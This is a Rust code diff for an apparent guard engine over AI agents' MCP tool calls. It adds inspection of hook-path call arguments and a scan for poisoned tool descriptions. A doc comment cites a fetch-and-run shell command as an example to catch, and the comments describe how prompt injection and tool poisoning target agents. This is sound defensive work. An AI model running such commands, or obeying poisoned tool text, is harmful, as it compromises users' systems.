@@ -32,7 +32,7 @@ use crate::engine::decide::decide;
 use crate::engine::rules::RuleSet;
 use crate::engine::types::{Decision, SessionState, ToolCall};
 use crate::ipc::{read_frame, write_frame};
-use crate::mcp_scan::scan_response_for_injection;
+use crate::mcp_scan::{scan_response_for_injection, scan_tools_list_for_poisoning};
 
 // ──────────────────────────────────────────────────────────────
 // effective_calls — project an MCP tools/call onto the rule catalog
@@ -130,6 +130,53 @@ pub fn effective_calls(server_name: &str, params: &Value) -> Vec<ToolCall> {
     }
 
     calls
+}
+
+/// The same projection as [`effective_calls`], but for an MCP call that
+/// arrived over the HOOK path instead of through this proxy, returning only
+/// the derived sub-calls.
+///
+/// Two delivery paths reach the engine with the same MCP invocation. Through
+/// this proxy, `tools/call` is projected by `effective_calls` so a
+/// `{"command": "curl x | sh"}` argument is judged as the Bash call it will
+/// become. Through an agent hook, the daemon received `tool =
+/// "mcp__server__name"` and `input = <arguments>`, matched only the
+/// `mcp__*` tool name against the catalog, and never looked inside the
+/// arguments - so the identical call was gated by the proxy and waved through
+/// by the hook. Since the hook path is the one that is on by default, that was
+/// the gap that mattered.
+///
+/// The base call is deliberately NOT returned: the caller already holds it as
+/// the `ToolCall` it built from the request, and re-deciding it would double
+/// its effect on session state.
+///
+/// `session` is rewritten to the caller's real session rather than left as the
+/// server name (which is all `effective_calls` has available inside the
+/// proxy). Cross-call rules - `correlate.arm_sink`, `lethal_trifecta`, the
+/// dropper - key on session, so a projection filed under a different session
+/// would be invisible to exactly the detections that need it most.
+///
+/// Returns empty for any tool that is not `mcp__*`, so callers can invoke it
+/// unconditionally.
+pub fn hook_projections(tc: &ToolCall) -> Vec<ToolCall> {
+    let Some(rest) = tc.tool.strip_prefix("mcp__") else {
+        return Vec::new();
+    };
+    // `mcp__<server>__<tool>`. A server name containing `__` splits at the
+    // first separator, which still reconstructs the original tool string, and
+    // the projections below do not depend on the split being semantically
+    // right - only the (dropped) base call would.
+    let (server, name) = rest.split_once("__").unwrap_or((rest, ""));
+    let params = json!({ "name": name, "arguments": tc.input.clone() });
+
+    effective_calls(server, &params)
+        .into_iter()
+        .skip(1) // base call == `tc`, already decided by the caller
+        .map(|mut c| {
+            c.session.clone_from(&tc.session);
+            c
+        })
+        .collect()
 }
 
 // Caps for the catch-all projection (bound pathological/huge MCP arguments).
@@ -672,6 +719,17 @@ pub async fn pump_streams<RI, WO, WCI, RCO>(
                     // D1's injection scan stays independent of the redaction
                     // below — it always runs over the ORIGINAL bytes.
                     if let Some(reason) = scan_response_for_injection(&buf) {
+                        audit_mcp_response_alert(&s2c_cfg, &reason);
+                    }
+
+                    // Tool-poisoning scan over `tools/list` METADATA. Separate
+                    // from the marker scan above because a poisoned tool
+                    // description need contain no marker phrase at all — see
+                    // `scan_tools_list_for_poisoning`. Same alert-only
+                    // invariant, and it must stay alert-only: this path treats
+                    // Ask as Deny, so anything routed to Ask would hard-block a
+                    // legitimate server over description phrasing.
+                    if let Some(reason) = scan_tools_list_for_poisoning(&buf) {
                         audit_mcp_response_alert(&s2c_cfg, &reason);
                     }
 
